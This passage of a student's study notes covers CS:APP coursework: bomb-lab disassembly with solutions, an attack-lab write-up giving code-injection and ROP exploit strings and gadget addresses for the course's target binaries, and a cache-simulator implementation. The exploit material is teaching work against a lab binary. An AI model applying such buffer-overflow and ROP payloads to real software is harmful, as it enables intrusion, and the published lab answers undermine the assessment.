   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;    ;recursion until it reaches the end
   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)      ; 24rsp = 0
   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi       ;(gdb) x/s 0x40245e 0x40245e:       &quot;flyers&quot;
   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi      ; rdi = 16rsp
   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt; ;compare the rsi and rdi
   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax
   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;
   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;
   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)
   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;
   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax    ;eax = 0
   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;    ;jmp to phase_5 + 41
   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax
   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax
   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;
   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;
   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp
   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx
   0x00000000004010f3 &lt;+145&gt;:   retq   
End of assembler dump.
</code></pre>
<p>Crazy question :&lt;&gt;&lt;&gt;</p>
<h4 id="ans_4">Ans:</h4>
<p>ionevg</p>
<h3 id="phase_6">Phase_6</h3>
<pre><code class="language-assembly">s(gdb) disas phase_6
Dump of assembler code for function phase_6:
   0x00000000004010f4 &lt;+0&gt;:     push   %r14
   0x00000000004010f6 &lt;+2&gt;:     push   %r13
   0x00000000004010f8 &lt;+4&gt;:     push   %r12
   0x00000000004010fa &lt;+6&gt;:     push   %rbp
   0x00000000004010fb &lt;+7&gt;:     push   %rbx
   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp   
   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13    ;r13 = rsp      ;r13 and rsi can both represent input
   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi    ;rsi = rsp
   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;  ;load six inputs from rdi to rsp, see notes from phase_2, index by 4 each           ;rsp = six numbers
   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14    ;r14 = rsp
   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d   ;r12d = 0

   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp    ;rbp = r13, rbp=r13 = 2nd int
   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax       ;eax = r13 + 0, first number
   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax    ;eax = eax - 1
   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax    ;cmp eax,5      eax &lt;= 5, from previouse, eax &lt;= 6 
   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;    ;jmp if eax is below or equal to 5, has to
   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;  
   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d   ;r12d = r12d + 1 = 0 + 1
   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d   ;cmp 6, r12d(1)
   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;    ;jump if equal, not equal for the first
   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx   ;ebx = r12d = 1

   ;another loop to verify no repeated ints
   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax    ;rax = ebx = 1, rax=ebx=2
   ;movslq, movsbl src, dst byte to int, sign-extend, if the ebx -&gt; convert to single byte is 1, extend the sign bit
   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax   ;eax = rsp + rax*4 = rsp + 1*4, move the input string right by 1, index will increase again now
   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)   ;
   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;    ;can not be equal, 1st and 2nd
   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;
   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx    ;ebx = ebx + 1
   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx    ;cmp 5,ebx + 1
   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;    ;jmp if ebx &lt;= 5
   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13    ;r13 +4, move to 2nd int
   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt; ;

   ;32 - 93: go from each input, compare with make sure not higher than 6, and each int it will compare if it is the same as the rest of the ints. Make sure no repeated value appear, then in this case. the input 0,1,2,3,4,5,6

   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi  ;load last int to rsi
   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax    ;rax = r14 = first int index
   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx    ;ecx = 0x7

   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx    ;edx = ecx = 0x7
   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx  ; edx = edx - rax = 7 - 1st int
   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)  ; (rax) = edx
   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax    ; (rax) = rax + 0x4
   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax    ; cmp last_int, rax= (7-1st int) + 0x4 = 11 - 1st int, compare the last int with the 
   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;   ;

   ;95 - 121: loop six values, use 7 to subtrace each int

   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi    ;esi = 0
   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;

   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx; rdx = rdx +8 = -32
   ;0x6032d8 &lt;node1+8&gt;:     &quot;\340\062`&quot; , this is octal format, convert it to decimal = 224, 50,
   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax ;eax = 2
   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax    ;cmp 2nd int with 2, if not equal, keep adding 1 until it equals the 2nd int. 
   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;
   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;   ;if equal, eax = ecx = 2nd int
   ;from 169
   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx   ;if the value is 6 , edx = 76
   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)   ;rsp + 2*rsi + 20 = 1st int + 20 = move 1 to the last int
   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi    ;rsi = 0 +4
   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi   ;cmp if it reaches the end,
   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt; ;if not cont,

   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx ;rsp = (1st int + 0 *1) = ecx = 1st int, next loop go to 2nd int
   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx    ;cmp 1, ecx, if it is not 6, it should be higher here
   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;   ;jmp if ecx &lt; 1, guess only if the input is 6 in this case.
   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax    ;eax = 1
   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx   ;edx = 1
   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;
   ;store each int into a node, 1st int -&gt;node1, 2nd int -&gt;node2, the node number corresponds the same value of the converted input


   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx  ;   rbx = 1st int node number
   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax  ;   rax = 2nd int node number
   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi  ;end node
   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx        ;rcx = rbx = 2nd int node

   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx      ;rdx = value at node 2nd number 2, to rdx
   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)   ;rcx = rbx, load the value of 2
   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax        ;rax increase by 1 byte
   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax        ;
   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;
   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx        ;
   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;
 ; change the ptr orders based on the storing order.  i think the purpose here is for the below steps, instead of using the rsp + 20/28, it can use pointer arithmatic to plus 8 since we reassign the order of the linked list.

   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx) ;0 to the end?
   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp      ;rbp =  5

   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax   ;2nd node into rax
   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax      ;eax = value
   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)      ;rbx is the first node, cmp the node value
   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;   ;1st &gt; 2nd, else explode bomb
   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;
   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx   ;rbx index by 1, now go to 2nd
   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp        ;4
   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;   ; need zf = 0
   ;basically compare the value in the node index, increase the node index by 8 every time, make sure the previous one is always greater, sort in descending order

 ;(gdb) x/24wx 0x6032d0
0x6032d0 &lt;node1&gt;:       0x0000014c =  332    0x00000001      0x006032e0      0x00000000
0x6032e0 &lt;node2&gt;:       0x000000a8  = 168   0x00000002      0x006032f0      0x00000000
0x6032f0 &lt;node3&gt;:       0x0000039c =924     0x00000003      0x00603300      0x00000000
0x603300 &lt;node4&gt;:       0x000002b3  = 691   0x00000004      0x00603310      0x00000000
0x603310 &lt;node5&gt;:       0x000001dd = 477    0x00000005      0x00603320      0x00000000
0x603320 &lt;node6&gt;:       0x000001bb  = 443    0x00000006      0x00000000      0x00000000

 ;descending order. 3-&gt;4-&gt;5-&gt;6-&gt;1-&gt;2, and because we revert it by subtracting from 7, have to revert back

 ;4 3 2 1 6 5

   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp       ;
   0x00000000004011fb &lt;+263&gt;:   pop    %rbx
   0x00000000004011fc &lt;+264&gt;:   pop    %rbp
   0x00000000004011fd &lt;+265&gt;:   pop    %r12
   0x00000000004011ff &lt;+267&gt;:   pop    %r13
   0x0000000000401201 &lt;+269&gt;:   pop    %r14
   0x0000000000401203 &lt;+271&gt;:   retq   
End of assembler dump.
</code></pre>
<p>Notes:</p>
<p>In x86-64 assembly, registers like <code>%eax</code> do not have a fixed memory address because they are part of the CPU's internal state. Instead, <code>%eax</code> is a 32-bit register within the CPU that can hold a value. When you perform an operation like <code>mov 0x0(%r13), %eax</code>, you are transferring a value from memory into the <code>%eax</code> register, not an address.</p>
<p><strong>Storing Values</strong>: <code>RAX</code> can hold any integer value, which can be used for arithmetic operations, comparisons, or as a general-purpose register.</p>
<p><strong>Pointer/Address Holder</strong>: <code>RAX</code> can store memory addresses, allowing it to be used as a pointer to access or manipulate data in memory.</p>
<h4 id="ans_5">Ans:</h4>
<p>4 3 2 1 6 5</p>
<p><img alt="image-20240607022420435" src="../CSAPP.assets/image-20240607022420435.png" /> let's goooo</p>
<h2 id="lab3-attack-labcode-injection-and-rop-attack">Lab3 - Attack lab(Code Injection and ROP attack)</h2>
<p><img alt="image-20240610013516973" src="../CSAPP.assets/image-20240610013516973.png" /></p>
<p><img alt="image-20240610013526450" src="../CSAPP.assets/image-20240610013526450.png" /></p>
<p><img alt="image-20240610013535692" src="../CSAPP.assets/image-20240610013535692.png" /></p>
<h3 id="understanding-the-rdi-register-and-parameter-passing">Understanding the <code>rdi</code> Register and Parameter Passing</h3>
<ol>
<li><strong>Scalar Values (e.g., integers, floats):</strong></li>
<li>If the parameter is a scalar value (such as an integer or a float), the actual value is stored directly in the <code>rdi</code> register.</li>
<li>For example, if you pass an integer value <code>42</code> to a function, <code>rdi</code> will contain <code>42</code>.</li>
<li><strong>Pointers (e.g., strings, arrays, structs):</strong></li>
<li>If the parameter is a pointer (such as a string, array, or a struct), the <code>rdi</code> register will contain the address of the memory location where the actual data is stored.</li>
<li>For example, if you pass a string <code>"hello"</code> to a function, <code>rdi</code> will contain the address of the first character of the string in memory.</li>
</ol>
<h3 id="phase4">Phase4</h3>
<p>ROP attack -&gt; in the code instruction set, each code segment that ends with the return (c3) can be named as gadget.</p>
<p>To design, the asm code can be followed from the previous phase2.</p>
<p>usual way is we can move the cookie to the stack, and move the stack to the rdi, and push the function address and return. In this case, since we are going to use the code section, we can use rax to pass the cookie.</p>
<p>So the ASM will be:</p>
<pre><code class="language-assembly">pop rax ;58
ret
//pass the cookie
mov rax, rdi    ;48 89 c7
ret
//call the function
</code></pre>
<pre><code class="language-assembly">00000000004019a7 &lt;addval_219&gt;:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      retq   

00000000004019a0 &lt;addval_273&gt;:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq   


;4019a7 + 4 = 4019ab // ab 19 40
;pass the cookie as rax // fa 97 b9 59
;move rax,rdi // 4019a2 // a2 19 40
;then push the function of touch2 //ec 17 40


</code></pre>
<pre><code class="language-cmd">./hex2raw &lt; 4ansmyown.txt | ./rtarget -q

cmd to run
</code></pre>
<p><strong>Summary:</strong></p>
<ul>
<li>Starting the index at an address means the disassembler will interpret the bytes from that point as a complete instruction.</li>
<li>The disassembler decodes each instruction in sequence until it reaches the end of the function or another stopping point.</li>
<li>For <code>mov</code> or any other instructions, it decodes the entire instruction set starting from the given address.</li>
</ul>
<p><strong>Important Points from lab manual:</strong></p>
<ul>
<li>Your exploit string must not contain byte value 0x0a at any intermediate position, since this is the ASCII code for newline (‘\n’). When Gets encounters this byte, it will assume you intended to terminate the string. </li>
<li>HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte ordering).</li>
</ul>
<h3 id="phase5">Phase5</h3>
<p>The cookie in ASCII is: <code>35 39 62 39 39 37 66 61 00</code></p>
<p>Old way is to pass the cookie as an rax into the register and move it into the stack memory address and called the memory address.</p>
<pre><code class="language-assembly">\\\from phase_3, 0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq   

48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00     ;the stack address of the previous
35 39 62 39 39 37 66 61     ;store this cookie on the test stack
00
</code></pre>
<pre><code class="language-assembly">Idea is to make sure there is enough stack address that was able to get used in this case


;use below instructions to load the stack address of the rdi, rsi will be used to set as an offset
000000000000006a &lt;add_xy&gt;:
  6a:   f3 0f 1e fa             endbr64 
  6e:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  72:   c3                      retq   

; From the farm.asm file, only the instruction movl ecx,esi is being found, so we can only use this and pass around the registers
; next find only the 
mov edx, ecx
mov eax, edx
// after adding bias.
pop rax,
mov rax, rdi    ;rdi will be the top address of the stack on test
mov rsp, rax


</code></pre>
<p><img alt="image-20240617002317736" src="../CSAPP.assets/image-20240617002317736.png" /></p>
<pre><code>00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
</code></pre>
<h3 id="references">References:</h3>
<p>https://www.jianshu.com/p/db731ca57342</p>
<p>https://zhuanlan.zhihu.com/p/60724948</p>
<p>https://blog.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-5.html</p>
<h2 id="lab4">Lab4</h2>
<p><img alt="image-20240623201924113" src="../CSAPP.assets/image-20240623201924113.png" /></p>
<h3 id="part1">Part1</h3>
<p>Idea is to design sets -&gt; cache_lines, dynamic allocate memory</p>
<p>Since we can only know the 2d array size after getting the size array from command line inputs, we have to dynamic allocate memory in this case.</p>
<h3 id="struct-and-typedef-in-c">struct and typedef in c</h3>
<pre><code class="language-c">//Struct:
struct struct_name {
    // Member variables (also called fields or members)
    type1 member1;
    type2 member2;
    // ...
    typeN memberN;
};
// Define a structure named 'Person' with members name, age, and height
struct Person {
    char name[50];
    int age;
    float height;
};

struct Person {
   // code
} person1, person2, p[20];
In both cases,

//person1 and person2 are struct Person variables
//p[] is a struct Person array of size 20.


// Declaring variables of type 'struct Person'
struct Person person1, person2;

//typedef

</code></pre>
<p>https://www.programiz.com/c-programming/c-structures</p>
<p><img alt="image-20240624021518787" src="../CSAPP.assets/image-20240624021518787.png" /></p>
<p><img alt="image-20240624000353910" src="../CSAPP.assets/image-20240624000353910.png" /></p>
<h3 id="lru-counter-logic">LRU counter logic</h3>
<p>Initialize LRU counter to 0 -&gt; valid bit is 0; free</p>
<p>how to determine, if there is a find</p>
<p>loop through each line to find smallest, if it is 0, directly assigned</p>
<p><img alt="image-20240624171008548" src="../CSAPP.assets/image-20240624171008548.png" /></p>
<p>booo, ez</p>
<p>Full Code</p>
<pre><code class="language-c">#include &quot;cachelab.h&quot;
#include &lt;unistd.h&gt;
#include &lt;getopt.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;

#define uint_32max 1 &lt;&lt; 31;
// finish the block of getting the command arguments

struct cache_line{
    int valid_bit;
    int tag;
    int LRU_counter;
}cache_line;

struct result{
    int hit;
    int miss;
    int eviction;
}result;

typedef struct cache_line *cache_line_entry;
typedef cache_line_entry *cache_set_entry;

void usage(){
    printf(&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;);
    printf(&quot;Options:\n&quot;);
    printf(&quot;  -h         Print this help message.\n&quot;);
    printf(&quot;  -v         Optional verbose flag.\n&quot;);
    printf(&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;);
    printf(&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;);
    printf(&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;);
    printf(&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;);
    printf(&quot;Examples:\n&quot;);
    printf(&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;);
    printf(&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;);

}


void update_result(char I,unsigned int address,cache_set_entry cache,int sets,int E,int b,int v){
    unsigned set_index_cast = (1 &lt;&lt; sets) -1;

    unsigned set_index = address &gt;&gt; b &amp; set_index_cast;

    unsigned tag = address &gt;&gt; (sets+b);

    int evict_true = 1;

    unsigned smallest_LRU= uint_32max; //first initliaze, 
    unsigned replaced_LRU_index;

    unsigned largest_LRU = 0;
    // printf(&quot;%d %d \n&quot;, set_index, tag);
    // load or store, trigger once

    for (int i = 0; i &lt; E;i++){
        if(cache[set_index][i].valid_bit == 0){
            //if there is empty line, no need to evict
            evict_true = 0;
            replaced_LRU_index = i;
            break;
        }
        else
        {
            if(cache[set_index][i].LRU_counter &lt;= smallest_LRU){
                smallest_LRU = cache[set_index][i].LRU_counter;
                replaced_LRU_index = i;
            }
        }
    }

    for (int i = 0; i &lt; E;i++){
        if(cache[set_index][i].LRU_counter &gt; largest_LRU){
            largest_LRU = cache[set_index][i].LRU_counter;
        }
    }

        for (int i = 0; i &lt; E; i++)
        {
            if (cache[set_index][i].tag == tag &amp;&amp; cache[set_index][i].valid_bit == 1)
            {
                // found
                result.hit++;
                if(v){
                    if (I != 'M')
                    {
                        printf(&quot; hit\n&quot;);
                    }
                    else if (I == 'M')
                    {
                        printf(&quot; hit&quot;);
                    }
                }


                // tmr question, how to handle LRU
                cache[set_index][i].LRU_counter = largest_LRU + 1;
                return;
            }
        }
    //didn't find, miss++ and determine if need to evict

    result.miss++;

    if (evict_true)
    {
        if(v){
            if(I == 'M'){
                printf(&quot; miss eviction&quot;);
            }else{
                printf(&quot; miss eviction\n&quot;);
            }
        }


        result.eviction++;
        cache[set_index][replaced_LRU_index].tag = tag;
        cache[set_index][replaced_LRU_index].valid_bit = 1;
        cache[set_index][replaced_LRU_index].LRU_counter = largest_LRU + 1;
    }
    else
    {
        if(v){
            if(I == 'M'){
                printf(&quot; miss&quot;);
            }else{
                printf(&quot; miss\n&quot;);
            }
        }


        cache[set_index][replaced_LRU_index].tag = tag;
        cache[set_index][replaced_LRU_index].valid_bit = 1;
        cache[set_index][replaced_LRU_index].LRU_counter = largest_LRU + 1;
    }

}

void read_file(char* file,cache_set_entry cache,int sets,int E,int b,int v){
    FILE *pFile;
    char identifier;
    unsigned address; //unsigned int
    int size;


    pFile = fopen(file, &quot;r&quot;);
    while (fscanf(pFile,&quot; %c %x,%d&quot;,&amp;identifier,&amp;address,&amp;size)&gt;0)
    {
        /* code */

        if(identifier == 'L' || identifier =='S'){
            if(v){
                printf(&quot;%c %x,%d&quot;, identifier, address, size);
            }

            update_result(identifier, address, cache, sets, E, b,v);
        }else if(identifier =='M'){
            if(v){
                printf(&quot;%c %x,%d&quot;, identifier, address, size);
            }
            update_result(identifier, address, cache, sets, E, b,v);
            update_result('R', address, cache, sets, E, b,v);
        }

        // doing actual code here

    }
    fclose(pFile);
}




cache_set_entry cache_init(int sets,int E){
    int e = pow(2, sets); // equivalent to 1 &lt;&lt; sets;
    // printf(&quot;%d&quot;, e);
    cache_set_entry cache = (cache_set_entry)malloc(e * sizeof(cache_line_entry));
    //first allocate the memory of sets
    for (int i = 0; i &lt; e;i++){
        cache[i] = (cache_line_entry)calloc(E , sizeof(cache_line));
    }
    return cache;
}

void free_memory(cache_set_entry cache,int sets){
    for (int i = 0; i &lt; sets;i++){
        free(cache[i]);
    }
    free(cache);
}

int main(int argc,char** argv)
{
    //get the arguments

    int opt, v = 0, s, e, b;
    char* file;
    cache_set_entry cache;
    // the file initiliazer

    while(-1 != (opt = getopt(argc,argv,&quot;hvs:E:b:t:&quot;))){
        switch(opt){
            case 'h':
                usage();
                return 0;
            case 'v':
                v = 1;
                break;
            case 's':
                s = atoi(optarg);
                break;
            case 'E':
                e = atoi(optarg);
                break;
            case 'b':
                b = atoi(optarg);
                break;
            case 't':
                file = (optarg);
                // printf(&quot;%s&quot;,file);
                break;
            default:
                usage();
                break;
        }
    }
    //allocate memory
    //question, how to set the index bit in the cache?
    //s is used to define 
    // cache[S][E], S = 2^s, 
    cache = cache_init(s,e);

    // for (int i = 0; i &lt; s;i++){
    //     for (int j = 0; j &lt; e;j++){
    //         printf(&quot;%d  %d \n&quot;,j, cache[i][j].valid_bit);
    //     }
    // }
    read_file(file,cache,s,e,b,v);

    printSummary(result.hit, result.miss, result.eviction);
    free_memory(cache,s);
    return 0;
}

</code></pre>
<h3 id="part-b">Part B:</h3>
<p>1 kilobytes of cache, E =1, Block size = 32bytes = 2^5, S = 5, 32 sets</p>
<p>int = 4bytes, 32/4 = 8, it can fit 8ints, </p>
<h4 id="32-x-32">32 x 32</h4>
<p>Explain on why diagnose will cause the cache hit the same set</p>
<h3 id="memory-address-to-cache-index-mapping">Memory Address to Cache Index Mapping</h3>
<p>In a direct-mapped cache, the cache index is determined by the formula:</p>
<p>Index=(Memory Address/Block Size)%Number of Sets\text{Index} = (\text{Memory Address} / \text{Block Size}) \% \text{Number of Sets}Index=(Memory Address/Block Size)%Number of Sets</p>
<p>Given your cache parameters:</p>
<ul>
<li><strong>Cache Size:</strong> 1 KB (1024 bytes)</li>
<li><strong>Block Size:</strong> 32 bytes</li>
<li><strong>Number of Sets:</strong> 32</li>
</ul>
<h3 id="example-calculation-address-and-index-for-akk">Example Calculation: Address and Index for <code>A[k][k]</code></h3>
<p>For diagonal element <code>A[k][k]</code> in a 32x32 matrix:</p>
<ol>
<li><strong>Memory Address Calculation:</strong></li>
<li>Base address of <code>A</code> (assumed): <code>Base Address(A) = 0x00000000</code></li>
<li>Address of <code>A[k][k]</code>: Address(A[k][k])=Base Address(A)+(k×32+k)×4\text{Address}(A[k][k]) = \text{Base Address}(A) + (k \times 32 + k) \times 4Address(A[k][k])=Base Address(A)+(k×32+k)×4 =0x00000000+(k×32+k)×4= 0x00000000 + (k \times 32 + k) \times 4=0x00000000+(k×32+k)×4 =(k×33)×4= (k \times 33) \times 4=(k×33)×4 =k×132= k \times 132=k×132</li>
<li><strong>Cache Index Calculation:</strong></li>
<li>Index=(k×132/32)%32\text{Index} = (k \times 132 / 32) \% 32Index=(k×132/32)%32</li>
<li>=(k×4.125)%32= (k \times 4.125) \% 32=(k×4.125)%32</li>
</ol>
<h3 id="example-calculation-address-and-index-for-bkk">Example Calculation: Address and Index for <code>B[k][k]</code></h3>
<p>For diagonal element <code>B[k][k]</code> in a 32x32 matrix:</p>
<ol>
<li><strong>Memory Address Calculation:</strong></li>
<li>Base address of <code>B</code> (assumed): <code>Base Address(B) = 0x00008000</code></li>
<li>Address of <code>B[k][k]</code>: Address(B[k][k])=Base Address(B)+(k×32+k)×4\text{Address}(B[k][k]) = \text{Base Address}(B) + (k \times 32 + k) \times 4Address(B[k][k])=Base Address(B)+(k×32+k)×4 =0x00008000+(k×32+k)×4= 0x00008000 + (k \times 32 + k) \times 4=0x00008000+(k×32+k)×4 =0x00008000+(k×33)×4= 0x00008000 + (k \times 33) \times 4=0x00008000+(k×33)×4 =0x00008000+k×132= 0x00008000 + k \times 132=0x00008000+k×132</li>
<li><strong>Cache Index Calculation:</strong></li>
<li>Index=((0x00008000+k×132)/32)%32\text{Index} = ((0x00008000 + k \times 132) / 32) \% 32Index=((0x00008000+k×132)/32)%32</li>
<li>=((0x00008000/32)+(k×132/32))%32= ((0x00008000 / 32) + (k \times 132 / 32)) \% 32=((0x00008000/32)+(k×132/32))%32</li>
<li>=(0x2000+k×4.125)%32= (0x2000 + k \times 4.125) \% 32=(0x2000+k×4.125)%32</li>
</ol>
<h3 id="simplifying-the-index-calculation">Simplifying the Index Calculation</h3>
<p>To see if <code>A[k][k]</code> and <code>B[k][k]</code> map to the same index, we need to examine the modulo operation:</p>
<ol>
<li><strong>For <code>A[k][k]</code>:</strong></li>
<li>(k×4.125)%32(k \times 4.125) \% 32(k×4.125)%32</li>
<li><strong>For <code>B[k][k]</code>:</strong></li>
<li>The base address <code>0x00008000</code> converts to 32768 in decimal.</li>
<li>(32768/32)=1024(32768 / 32) = 1024(32768/32)=1024</li>
<li>1024%32=01024 \% 32 = 01024%32=0</li>
<li>Therefore, the index calculation for <code>B[k][k]</code> simplifies to: (0+k×4.125)%32(0 + k \times 4.125) \% 32(0+k×4.125)%32</li>
<li>=(k×4.125)%32= (k \times 4.125) \% 32=(k×4.125)%32</li>
</ol>
<h3 id="conclusion">Conclusion</h3>
<p>Both <code>A[k][k]</code> and <code>B[k][k]</code> indeed map to the same cache index because the addition of the base address <code>0x00008000</code> results in a zero modulo 32, effectively making the cache index calculation dependent only on the <code>k \times 4.125</code> term for both matrices.</p>
<h3 id="cache-conflict-explanation">Cache Conflict Explanation</h3>
<p>Since both <code>A[k][k]</code> and <code>B[k][k]</code> map to the same cache index, they will contend for the same cache line. When you read <code>A[k][k]</code> and then write <code>B[k][k]</code>, the cache line for <code>A</code> gets evicted and replaced by the line for <code>B</code>. This causes a cache miss the next time you access <code>A[k][k]</code> or <code>B[k][k]</code>.</p>
<h4 id="64-x-64">64 x 64</h4>
<p>https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&amp;utm_medium=referral</p>
